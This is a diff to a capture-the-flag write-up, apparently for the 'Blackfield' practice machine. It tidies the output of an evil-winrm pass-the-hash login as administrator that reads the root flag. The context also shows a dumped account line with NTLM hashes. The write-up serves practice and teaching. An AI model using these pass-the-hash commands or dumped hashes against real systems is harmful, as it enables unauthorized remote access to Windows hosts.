@@ -485,14 +485,9 @@ support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212::
 
 ```powershell
  evil-winrm -i blackfield.local -u administrator -H '184fb5e5178480be64824d4cd53b99ee'
-                                        
+
 Evil-WinRM shell v3.9
-                                        
-Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
-                                        
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-                                        
-Info: Establishing connection to remote endpoint
+
 *Evil-WinRM* PS C:\Users\Administrator\Documents> type ../desktop/root.txt
 4375a629c7c67c8e29db269060c955cb
 ```
